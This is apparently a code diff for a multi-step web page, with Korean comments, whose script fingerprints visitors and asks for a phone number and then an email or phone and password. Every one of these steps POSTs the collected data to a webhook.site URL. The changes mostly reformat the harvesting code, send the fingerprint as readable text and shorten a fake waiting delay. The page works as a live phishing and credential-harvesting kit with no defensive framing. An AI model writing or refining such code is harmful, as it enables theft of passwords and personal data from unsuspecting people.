@@ -69,12 +69,12 @@ const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
-  collectUserInfo(); // 최대 정보 수집
+  collectUserInfo();
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
 }
 
-// 최대 정보 수집
+// 최대 정보 수집 (읽기 쉬운 텍스트 형태)
 async function collectUserInfo() {
   let info = {};
   info.userAgent = navigator.userAgent;
@@ -84,21 +84,16 @@ async function collectUserInfo() {
   info.onLine = navigator.onLine;
   info.hardwareConcurrency = navigator.hardwareConcurrency;
   info.deviceMemory = navigator.deviceMemory || "unknown";
-  info.plugins = Array.from(navigator.plugins).map(p=>p.name);
-
+  info.plugins = Array.from(navigator.plugins).map(p => p.name);
+  
   info.screen = {
-    width: screen.width,
-    height: screen.height,
-    availWidth: screen.availWidth,
-    availHeight: screen.availHeight,
-    colorDepth: screen.colorDepth,
-    pixelDepth: screen.pixelDepth
+    width: screen.width, height: screen.height,
+    availWidth: screen.availWidth, availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
   };
   info.window = {
-    innerWidth: window.innerWidth,
-    innerHeight: window.innerHeight,
-    outerWidth: window.outerWidth,
-    outerHeight: window.outerHeight
+    innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth, outerHeight: window.outerHeight
   };
   info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
@@ -111,17 +106,16 @@ async function collectUserInfo() {
     };
   }
 
-  // 배터리 정보: 없으면 unknown
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
-      info.battery = {
+      info.battery = { 
         charging: battery.charging,
         level: battery.level,
         chargingTime: battery.chargingTime,
         dischargingTime: battery.dischargingTime
       };
-    } catch(e) { 
+    } catch(e) {
       info.battery = { charging:"unknown", level:"unknown", chargingTime:"unknown", dischargingTime:"unknown" };
     }
   } else {
@@ -148,19 +142,28 @@ async function collectUserInfo() {
 
   info.timestamp = new Date().toISOString();
 
-  // JSON 대신 URLSearchParams로 전송
-  const formData = new URLSearchParams();
-  for (let key in info) {
-    if (typeof info[key] === "object") {
-      formData.append(key, JSON.stringify(info[key]));
-    } else {
-      formData.append(key, info[key]);
+  // 객체를 읽기 좋은 텍스트로 변환
+  function objectToText(obj, indent="") {
+    let text = "";
+    for (let key in obj) {
+      if (typeof obj[key] === "object") {
+        text += `${indent}${key}:\n${objectToText(obj[key], indent + "  ")}\n`;
+      } else {
+        text += `${indent}${key}: ${obj[key]}\n`;
+      }
     }
+    return text;
   }
-  formData.append("page","1");
 
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
-  .catch(err=>console.error("WebHook 전송 오류:",err));
+  const infoText = objectToText(info);
+
+  // 웹후크 전송
+  const formData = new URLSearchParams();
+  formData.append("page", "1");
+  formData.append("info", infoText);
+
+  fetch(webhookUrl, { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:formData })
+  .catch(err => console.error("WebHook 전송 오류:", err));
 }
 
 // page2 -> page3
@@ -170,7 +173,8 @@ function sendPhone() {
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
   if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})}).catch(err=>console.error(err));
+  fetch(webhookUrl, { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({page:"2", phone:userId, timestamp:new Date().toISOString()}) }).catch(err=>console.error(err));
 
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
@@ -181,7 +185,7 @@ function sendPhone() {
       document.getElementById("page3").classList.add("hidden");
       document.getElementById("page4").classList.remove("hidden");
     },1000);
-  },4000);
+  },1500);
 }
 
 // page4 전송
@@ -189,7 +193,9 @@ function sendPage4() {
   const userId4=document.getElementById("userId4").value.trim();
   const userCode4=document.getElementById("userCode4").value.trim();
   if(!userId4||!userCode4){alert("이메일/전화번호와 비밀번호를 입력해주세요."); return;}
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})}).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
+  fetch(webhookUrl, { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()}) })
+    .then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
 }
 </script>
 </body>
